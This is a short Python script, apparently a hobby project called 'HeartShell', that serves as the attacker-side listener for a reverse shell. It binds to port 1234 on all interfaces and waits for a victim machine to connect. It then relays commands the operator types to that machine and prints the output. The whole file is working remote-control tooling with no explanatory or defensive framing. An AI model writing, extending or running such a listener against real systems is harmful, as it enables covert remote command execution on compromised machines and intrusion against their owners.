#!/usr/bin/python3

import socket
from termcolor import colored

def shell():
	while True:
		command = input(f"*HeartShell-{str(ip)}#: ") # data type String
		target.send(command.encode('utf-8'))

		# End shell session
		if command == 'q':
			break
		else:
			result = target.recv(1024) # data type Bytes
			print(result.decode('utf-8'))

def server():
	# Creating global variables so that can be used in different functions
	global s
	global target
	global ip
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

	host = '0.0.0.0'
	port = 1234

	s.bind((host, port))
	s.listen(5)

	print(colored("[+] Listening for incoming connection ...", 'green'))

	target, ip = s.accept()

	print(colored(f"[+] Connection established from: {str(ip)}", 'green'))

	s.close()

server()
shell()